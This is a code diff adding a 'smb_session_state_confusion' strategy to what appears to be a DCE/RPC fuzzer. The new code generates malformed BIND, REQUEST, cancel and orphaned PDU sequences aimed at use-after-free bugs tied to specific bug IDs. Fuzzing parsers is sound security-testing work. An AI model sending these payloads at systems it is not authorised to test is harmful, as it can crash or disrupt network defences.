@@ -52,13 +52,14 @@ DCERPC_STRATEGIES = [
     "multi_bind_ack_confusion",
     "uuid_manipulation",
     "connection_state_uaf",
+    "smb_session_state_confusion",
 ]
 
 # Base weights (raw; normalised downstream). The deepest / highest-yield
 # parser surfaces (fragmentation, bind/context, stub data, auth) get the
 # most mass; edge-case strategies get less.
 DCERPC_WEIGHTS = [
-    12, 14, 8, 10, 10, 12, 6, 7, 5, 10, 4, 8, 6, 7, 15,
+    12, 14, 8, 10, 10, 12, 6, 7, 5, 10, 4, 8, 6, 7, 15, 13,
 ]
 
 DCERPC_STRATEGY_LABELS = {
@@ -77,6 +78,7 @@ DCERPC_STRATEGY_LABELS = {
     "multi_bind_ack_confusion":    "Multi-BIND_ACK Confusion",
     "uuid_manipulation":           "UUID Manipulation",
     "connection_state_uaf":         "Connection State UAF (CVE-2026-20026/27)",
+    "smb_session_state_confusion":  "SMB/DCE Session State Confusion (CSCwu17809/23995)",
 }
 
 
@@ -1075,6 +1077,79 @@ def build_dcerpc_payload(strategy: str, payload_override=None) -> bytes:
                 frames += _request_pdu(stub, opnum=random.randint(0, 10),
                                        call_id=i + 2,
                                        flags=_PFC_FIRST_FRAG)
+            return frames
+
+    # ── smb_session_state_confusion (CSCwu17809, CSCwu23995) ─────────
+    # Targets the DCE/RPC-over-SMB path: rapidly sets up and tears down
+    # SMB sessions while DCE/RPC BINDs and REQUESTs are in flight.
+    # The SMB session teardown frees dce_smb tracking state while the
+    # DCE/RPC layer still holds references — UAF / state confusion.
+    elif strategy == "smb_session_state_confusion":
+        variant = random.choice([
+            "bind_across_sessions", "request_after_teardown",
+            "rapid_rebind_cycle", "interleaved_cancel_teardown",
+            "multi_context_session_churn",
+        ])
+
+        if variant == "bind_across_sessions":
+            frames = b""
+            for i in range(100):
+                frames += _bind_pdu(call_id=i * 3 + 1)
+                frames += _request_pdu(os.urandom(random.randint(50, 300)),
+                                       opnum=random.randint(0, 15),
+                                       call_id=i * 3 + 2)
+                frames += _bind_pdu(call_id=i * 3 + 3)
+            return frames
+
+        elif variant == "request_after_teardown":
+            frames = _bind_pdu()
+            for i in range(200):
+                frames += _request_pdu(os.urandom(random.randint(80, 400)),
+                                       opnum=random.randint(0, 10),
+                                       call_id=i + 2)
+                if i % 20 == 19:
+                    frames += _bind_pdu(call_id=i + 1000)
+            return frames
+
+        elif variant == "rapid_rebind_cycle":
+            frames = b""
+            for i in range(150):
+                uuid = os.urandom(16) if random.random() < 0.3 else _UUID_SRVSVC
+                contexts = [(0, uuid, random.randint(0, 5), _UUID_NDR, 2)]
+                frames += _bind_pdu(contexts, call_id=i * 2 + 1)
+                frames += _request_pdu(os.urandom(random.randint(50, 200)),
+                                       opnum=random.randint(0, 20),
+                                       call_id=i * 2 + 2)
+            return frames
+
+        elif variant == "interleaved_cancel_teardown":
+            frames = _bind_pdu()
+            for i in range(100):
+                cid = i + 2
+                frames += _request_pdu(os.urandom(random.randint(100, 500)),
+                                       opnum=random.randint(0, 5),
+                                       call_id=cid,
+                                       flags=_PFC_FIRST_FRAG)
+                frames += _co_cancel_pdu(call_id=cid)
+                frames += _orphaned_pdu(call_id=cid)
+                if i % 10 == 9:
+                    frames += _bind_pdu(call_id=cid + 5000)
+            return frames
+
+        else:  # multi_context_session_churn
+            contexts = [(i, os.urandom(16), random.randint(0, 5),
+                         _UUID_NDR, 2) for i in range(8)]
+            frames = _bind_pdu(contexts)
+            for i in range(200):
+                ctx = random.randint(0, 9)
+                frames += _request_pdu(os.urandom(random.randint(50, 300)),
+                                       opnum=random.randint(0, 20),
+                                       context_id=ctx,
+                                       call_id=i + 1)
+                if i % 25 == 24:
+                    new_ctx = [(j, os.urandom(16), random.randint(0, 5),
+                                _UUID_NDR, 2) for j in range(8)]
+                    frames += _bind_pdu(new_ctx, call_id=i + 3000)
             return frames
 
     # ── fallback ────────────────────────────────────────────────────────
